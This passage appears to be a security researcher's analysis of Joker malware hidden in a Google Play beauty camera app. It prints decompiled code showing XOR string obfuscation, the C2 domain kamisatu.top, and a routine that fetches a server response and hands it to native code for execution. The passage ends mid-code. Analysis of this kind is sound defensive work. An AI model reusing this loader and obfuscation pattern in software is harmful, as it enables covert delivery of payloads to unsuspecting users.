<h2>Basic information</h2>
<p>Joker malware, at the time of writing, was still available at <code>play.google.com/store/apps/details?id=com.onmybeauty.beautycamera</code>
<img alt="" src="../../../../uploads/2024/09/1.png"></p>
<p>As of the date of analysis, the app is still available and has more than 100,000 downloads with the last update being published on 17/09/2024.
Once downloaded and installed by the user, the interface itself does not look malicious and matches the description on Google Play Store: <code>The beauty camera can replace the camera software on your original phone, allowing you to better capture beautiful memories</code>. The appearance of the running application:</p>
<p><img alt="" src="../../../../uploads/2024/09/3.png"></p>
<h2>Technical analysis</h2>
<p>Every Android application starts with an <code>AndroidManifest.xml</code> file. It defines the components of the application, including activities, services and permissions. In the context of analysis, the key information is to determine the starting point of the application:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">&quot;com.onmybeauty.beautycamera.LoadingActivity&quot;</span> <span class="na">android:exported=</span><span class="s">&quot;true&quot;</span><span class="nt">&gt;</span>
            <span class="nt">&lt;intent-filter&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&quot;android.intent.action.MAIN&quot;</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&quot;android.intent.category.LAUNCHER&quot;</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
        <span class="nt">&lt;/activity&gt;</span>
</code></pre></div>


<p>In the case of the analyzed application, the starting point is <code>com.onmybeauty.beautycamera.LoadingActivity</code>. Therefore, here we will start static code analysis. The manifest contained in the apk file, also allows you to extract additional information, for example, about permissions:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.CAMERA&quot;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> <span class="na">android:maxSdkVersion=</span><span class="s">&quot;28&quot;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.INTERNET&quot;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.CHANGE_NETWORK_STATE&quot;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;com.google.android.gms.permission.AD_ID&quot;</span><span class="nt">/&gt;</span>
</code></pre></div>


<p>By analyzing the starting point in the decompiled application, we are able to identify critical points for analysis:</p>
<p><img alt="" src="../../../../uploads/2024/09/4.png"></p>
<p>After the initialization of the <code>onCreate()</code> method, a number of actions take place, including the creation of an interface for the user. However, we are interested in two specific lines of code:</p>
<div class="highlight"><pre><span></span><code><span class="n">Network</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">new</span> <span class="n">NetConfig</span><span class="p">.</span><span class="na">Builder</span><span class="p">().</span><span class="na">baseUrl</span><span class="p">(</span><span class="n">AbstractC1835n</span><span class="p">.</span><span class="na">m226m</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">103</span><span class="p">,</span> <span class="o">-</span><span class="mi">56</span><span class="p">,</span> <span class="o">-</span><span class="mi">51</span><span class="p">,</span> <span class="o">-</span><span class="mi">63</span><span class="p">,</span> <span class="o">-</span><span class="mi">54</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="o">-</span><span class="mi">97</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">35</span><span class="p">,</span> <span class="o">-</span><span class="mi">49</span><span class="p">,</span> <span class="o">-</span><span class="mi">40</span><span class="p">},</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">12</span><span class="p">,</span> <span class="o">-</span><span class="mi">87</span><span class="p">,</span> <span class="o">-</span><span class="mi">96</span><span class="p">,</span> <span class="o">-</span><span class="mi">88</span><span class="p">,</span> <span class="o">-</span><span class="mi">71</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="o">-</span><span class="mi">22</span><span class="p">})).</span><span class="na">build</span><span class="p">());</span>
<span class="n">Network</span><span class="p">.</span><span class="na">net</span><span class="p">();</span>
</code></pre></div>


<p>The <code>AbstractC1835n.m226m</code> function is designed to obfuscate code by encrypting key strings. It applies an XOR operation to arrays of bytes to decrypt the data: </p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">m226m</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bArr</span><span class="p">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">bArr2</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">bArr</span><span class="p">.</span><span class="na">length</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">length2</span> <span class="o">=</span> <span class="n">bArr2</span><span class="p">.</span><span class="na">length</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">i2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">i2</span> <span class="o">&gt;=</span> <span class="n">length2</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">i2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">bArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)</span> <span class="p">(</span><span class="n">bArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">^</span> <span class="n">bArr2</span><span class="o">[</span><span class="n">i2</span><span class="o">]</span><span class="p">);</span>
            <span class="n">i</span><span class="o">++</span><span class="p">;</span>
            <span class="n">i2</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="p">(</span><span class="n">bArr</span><span class="p">,</span> <span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div>


<p>After decrypting the given string, we get the <code>kamisatu.top</code> domain. Then the application initializes the <code>Netowrk.init()</code> function to store the domain in the <code>NetConfig</code> variable of the <code>Network</code> class. In the next step, the application executes the <code>Network.net()</code> function, the implementation of which looks as follows:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">net</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">new</span> <span class="n">PostFormTask</span><span class="p">(</span><span class="k">new</span> <span class="n">LoadingCallback</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="p">()</span> <span class="p">{</span> 
            <span class="nd">@Override</span> 
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onSuccess</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span><span class="n">Network</span><span class="p">.</span><span class="na">sContext</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="mi">0</span><span class="p">).</span><span class="na">show</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">})</span> <span class="p">{</span> 
            <span class="nd">@Override</span> 
            <span class="kd">public</span> <span class="n">String</span> <span class="nf">getApi</span><span class="p">()</span> <span class="p">{</span>
                <span class="k">return</span> <span class="n">AbstractC1835n</span><span class="p">.</span><span class="na">m226m</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">70</span><span class="p">,</span> <span class="o">-</span><span class="mi">38</span><span class="p">,</span> <span class="o">-</span><span class="mi">30</span><span class="p">,</span> <span class="o">-</span><span class="mi">106</span><span class="p">,</span> <span class="o">-</span><span class="mi">91</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="o">-</span><span class="mi">55</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="o">-</span><span class="mi">38</span><span class="p">,</span> <span class="o">-</span><span class="mi">28</span><span class="p">,</span> <span class="o">-</span><span class="mi">121</span><span class="p">,</span> <span class="o">-</span><span class="mi">65</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="o">-</span><span class="mi">43</span><span class="p">,</span> <span class="mi">15</span><span class="p">},</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">105</span><span class="p">,</span> <span class="o">-</span><span class="mi">87</span><span class="p">,</span> <span class="o">-</span><span class="mi">121</span><span class="p">,</span> <span class="o">-</span><span class="mi">30</span><span class="p">,</span> <span class="o">-</span><span class="mi">47</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="o">-</span><span class="mi">89</span><span class="p">,</span> <span class="mi">118</span><span class="p">});</span>
            <span class="p">}</span>
        <span class="p">}.</span><span class="na">exe</span><span class="p">();</span>
    <span class="p">}</span>
</code></pre></div>


<p>The <code>PostFormTask</code> class, handles the construction and execution of the network request:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">PostFormTask</span> <span class="kd">extends</span> <span class="n">BaseTask</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="o">&lt;</span><span class="n">EntityType</span><span class="o">&gt;</span> <span class="nf">PostFormTask</span><span class="p">(</span><span class="n">RequestCallback</span><span class="o">&lt;</span><span class="n">EntityType</span><span class="o">&gt;</span> <span class="n">requestCallback</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">super</span><span class="p">(</span><span class="n">requestCallback</span><span class="p">,</span> <span class="n">RequestType</span><span class="p">.</span><span class="na">POST_FORM</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


<p><code>RequestType.POST_FORM</code> Specifies that this is a POST request. The <code>BaseTask</code> class is responsible for constructing the actual network request. The request configuration is implemented in the <code>BaseTask.doTask()</code> function, which is called after the <code>exe()</code> function is called:</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span> <span class="n">InterfaceC0394j</span> <span class="nf">doTask</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">String</span> <span class="n">transformUrl</span> <span class="o">=</span> <span class="n">transformUrl</span><span class="p">();</span> 
    <span class="n">C0371I</span> <span class="n">c0371i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">C0371I</span><span class="p">();</span> 

    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">mRequestType</span> <span class="o">==</span> <span class="n">RequestType</span><span class="p">.</span><span class="na">POST_FORM</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">c0371i</span><span class="p">.</span><span class="na">m3305d</span><span class="p">(</span><span class="n">transformUrl</span><span class="p">);</span>
        <span class="n">AbstractC0376N</span> <span class="n">buildPostForm</span> <span class="o">=</span> <span class="n">ParamsBuilder</span><span class="p">.</span><span class="na">buildPostForm</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">mParamsMap</span><span class="p">);</span>
        <span class="n">c0371i</span><span class="p">.</span><span class="na">m3306c</span><span class="p">(</span><span class="s">&quot;POST&quot;</span><span class="p">,</span> <span class="n">buildPostForm</span><span class="p">);</span> 
    <span class="p">}</span>
    <span class="n">ParamsBuilder</span><span class="p">.</span><span class="na">buildHeaders</span><span class="p">(</span><span class="n">c0371i</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="na">mHeaders</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">c0371i</span><span class="p">.</span><span class="na">m3308a</span><span class="p">();</span> 
<span class="p">}</span>
</code></pre></div>


<p><code>transformUrl()</code>: transforms the API path (/setting/scenery), potentially including any necessary parameters or applying encryption/decryption:</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span> <span class="n">String</span> <span class="nf">transformUrl</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">NetConfig</span> <span class="n">netConfig</span><span class="p">;</span>
        <span class="n">String</span> <span class="n">api</span> <span class="o">=</span> <span class="n">getApi</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">TextUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">api</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">api</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="n">AbstractC1835n</span><span class="p">.</span><span class="na">m226m</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">69</span><span class="p">},</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">106</span><span class="p">,</span> <span class="o">-</span><span class="mi">58</span><span class="p">,</span> <span class="o">-</span><span class="mi">70</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="o">-</span><span class="mi">59</span><span class="p">,</span> <span class="o">-</span><span class="mi">27</span><span class="p">,</span> <span class="mi">96</span><span class="p">,</span> <span class="o">-</span><span class="mi">57</span><span class="p">}))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">netConfig</span> <span class="o">=</span> <span class="n">Network</span><span class="p">.</span><span class="na">sConfig</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">TextUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">netConfig</span><span class="p">.</span><span class="na">baseUrl</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="n">AbstractC1835n</span><span class="p">.</span><span class="na">m226m</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">58</span><span class="p">,</span> <span class="o">-</span><span class="mi">127</span><span class="p">,</span> <span class="o">-</span><span class="mi">126</span><span class="p">,</span> <span class="o">-</span><span class="mi">30</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="o">-</span><span class="mi">101</span><span class="p">,</span> <span class="o">-</span><span class="mi">31</span><span class="p">,</span> <span class="o">-</span><span class="mi">117</span><span class="p">},</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">82</span><span class="p">,</span> <span class="o">-</span><span class="mi">11</span><span class="p">,</span> <span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="o">-</span><span class="mi">110</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="o">-</span><span class="mi">95</span><span class="p">,</span> <span class="o">-</span><span class="mi">50</span><span class="p">,</span> <span class="o">-</span><span class="mi">92</span><span class="p">})</span> <span class="o">+</span> <span class="n">Network</span><span class="p">.</span><span class="na">sConfig</span><span class="p">.</span><span class="na">baseUrl</span> <span class="o">+</span> <span class="n">api</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">api</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div>


<p><code>buildPostForm()</code>: Constructs form data for a POST request from the <code>mParamsMap</code> parameter map:</p>
<div class="highlight"><pre><span></span><code> <span class="kd">public</span> <span class="kd">static</span> <span class="n">AbstractC0376N</span> <span class="nf">buildPostForm</span><span class="p">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">String</span> <span class="n">obj</span><span class="p">;</span>
        <span class="n">ArrayList</span> <span class="n">arrayList</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="p">();</span>
        <span class="n">ArrayList</span> <span class="n">arrayList2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">map</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">for</span> <span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="p">:</span> <span class="n">map</span><span class="p">.</span><span class="na">entrySet</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">TextUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="na">getKey</span><span class="p">()))</span> <span class="p">{</span>
                    <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">entry</span><span class="p">.</span><span class="na">getValue</span><span class="p">();</span>
                    <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="n">entry</span><span class="p">.</span><span class="na">getKey</span><span class="p">();</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">value</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">obj</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="n">obj</span> <span class="o">=</span> <span class="n">value</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span>
                    <span class="p">}</span>
                    <span class="n">AbstractC0137f</span><span class="p">.</span><span class="na">m3656e</span><span class="p">(</span><span class="s">&quot;name&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
                    <span class="n">AbstractC0137f</span><span class="p">.</span><span class="na">m3656e</span><span class="p">(</span><span class="s">&quot;value&quot;</span><span class="p">,</span> <span class="n">obj</span><span class="p">);</span>
                    <span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">C0386b</span><span class="p">.</span><span class="na">m3282b</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&quot; \&quot;&#39;:;&lt;=&gt;@[]^`{}|/\\?#&amp;!$(),~&quot;</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="mi">91</span><span class="p">));</span>
                    <span class="n">arrayList2</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">C0386b</span><span class="p">.</span><span class="na">m3282b</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&quot; \&quot;&#39;:;&lt;=&gt;@[]^`{}|/\\?#&amp;!$(),~&quot;</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="mi">91</span><span class="p">));</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="k">new</span> <span class="n">C0403s</span><span class="p">(</span><span class="n">arrayList</span><span class="p">,</span> <span class="n">arrayList2</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div>


<p><code>Request Builder (C0371I)</code>: Creates a network request by setting the URL, HTTP method (POST) and content (form data).</p>
<p>The <code>exe()</code> method is called to perform the task and send the request:</p>
<div class="highlight"><pre><span></span><code><span class="nd">@Override</span>
<span class="kd">public</span> <span class="n">InterfaceC0394j</span> <span class="nf">exe</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">doTask</span><span class="p">();</span> 
<span class="p">}</span>
</code></pre></div>


<p>After a successful request, the response is processed by the <code>onSuccess()</code> method in the callback:</p>
<div class="highlight"><pre><span></span><code><span class="nd">@Override</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onSuccess</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span><span class="n">Network</span><span class="p">.</span><span class="na">sContext</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="mi">0</span><span class="p">).</span><span class="na">show</span><span class="p">();</span> 
<span class="p">}</span>
</code></pre></div>


<p>The response from the server is displayed in a Toast message, indicating that the server has returned encrypted data. Toast was probably used here as an alternative to the clipboard, since it does not require additional permissions. The Toast message that the user sees looks as follows:</p>
<p><img alt="" src="../../../../uploads/2024/09/5.png"></p>
<p>Here, Toast displays a string, which is the response back when a request is sent to <code>kamisatu.top/setting/scenery</code>. However, as it turns out, the value is not just displayed in the Toast, but is also passed in another part of the APK. The key method connecting the Toast message to the native code execution is the handleBody() method. This one is responsible for handling the server response and processing data after the message is displayed in the Toast:</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span> <span class="o">&lt;</span><span class="n">EntityType</span><span class="o">&gt;</span> <span class="kt">void</span> <span class="nf">handleBody</span><span class="p">(</span><span class="n">C0378P</span> <span class="n">c0378p</span><span class="p">,</span> <span class="n">RequestCallback</span><span class="o">&lt;</span><span class="n">EntityType</span><span class="o">&gt;</span> <span class="n">requestCallback</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">EntityType</span> <span class="n">entitytype</span><span class="p">;</span>
        <span class="n">Type</span> <span class="n">genericType</span><span class="p">;</span>
        <span class="n">AbstractC0382U</span> <span class="n">abstractC0382U</span> <span class="o">=</span> <span class="n">c0378p</span><span class="p">.</span><span class="na">f1052g</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">abstractC0382U</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">String</span> <span class="n">string</span> <span class="o">=</span> <span class="n">abstractC0382U</span><span class="p">.</span><span class="na">string</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">requestCallback</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="p">(</span><span class="n">genericType</span> <span class="o">=</span> <span class="n">Generics</span><span class="p">.</span><span class="na">getGenericType</span><span class="p">(</span><span class="n">requestCallback</span><span class="p">.</span><span class="na">getClass</span><span class="p">(),</span> <span class="n">RequestCallback</span><span class="p">.</span><span class="na">class</span><span class="p">))</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">genericType</span> <span class="o">==</span> <span class="n">Void</span><span class="p">.</span><span class="na">class</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">entitytype</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">entitytype</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">genericType</span> <span class="o">!=</span> <span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">Object</span> <span class="n">parseObject</span> <span class="o">=</span> <span class="n">JsonUtils</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">genericType</span><span class="p">);</span>
                    <span class="n">entitytype</span> <span class="o">=</span> <span class="n">parseObject</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">parseObject</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">onError</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">convert</span><span class="p">(</span><span class="n">AbstractC1835n</span><span class="p">.</span><span class="na">m226m</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">26</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="o">-</span><span class="mi">58</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="o">-</span><span class="mi">92</span><span class="p">,</span> <span class="o">-</span><span class="mi">59</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="o">-</span><span class="mi">62</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="o">-</span><span class="mi">121</span><span class="p">,</span> <span class="o">-</span><span class="mi">82</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="o">-</span><span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="o">-</span><span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">78</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="o">-</span><span class="mi">16</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="o">-</span><span class="mi">82</span><span class="p">},</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span> <span class="o">-</span><span class="mi">12</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="o">-</span><span class="mi">50</span><span class="p">,</span> <span class="o">-</span><span class="mi">88</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">66</span><span class="p">}),</span> <span class="n">AbstractC1835n</span><span class="p">.</span><span class="na">m226m</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">40</span><span class="p">,</span> <span class="o">-</span><span class="mi">13</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="o">-</span><span class="mi">107</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="o">-</span><span class="mi">121</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">25</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="o">-</span><span class="mi">104</span><span class="p">},</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">76</span><span class="p">,</span> <span class="o">-</span><span class="mi">110</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="o">-</span><span class="mi">12</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="o">-</span><span class="mi">89</span><span class="p">})),</span> <span class="n">requestCallback</span><span class="p">);</span>
                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="n">onSuccess</span><span class="p">(</span><span class="n">entitytype</span><span class="p">,</span> <span class="n">requestCallback</span><span class="p">);</span>
            <span class="n">BeautySoft</span><span class="p">.</span><span class="na">open</span><span class="p">((</span><span class="n">String</span><span class="p">)</span> <span class="n">entitytype</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">onError</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">convert</span><span class="p">(</span><span class="n">AbstractC1835n</span><span class="p">.</span><span class="na">m226m</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">73</span><span class="p">,</span> <span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="o">-</span><span class="mi">21</span><span class="p">,</span> <span class="o">-</span><span class="mi">40</span><span class="p">,</span> <span class="o">-</span><span class="mi">65</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="o">-</span><span class="mi">39</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="o">-</span><span class="mi">88</span><span class="p">,</span> <span class="o">-</span><span class="mi">17</span><span class="p">,</span> <span class="o">-</span><span class="mi">90</span><span class="p">,</span> <span class="o">-</span><span class="mi">21</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="o">-</span><span class="mi">78</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">6</span><span class="p">,</span> <span class="o">-</span><span class="mi">73</span><span class="p">,</span> <span class="o">-</span><span class="mi">105</span><span class="p">,</span> <span class="o">-</span><span class="mi">119</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="o">-</span><span class="mi">82</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">75</span><span 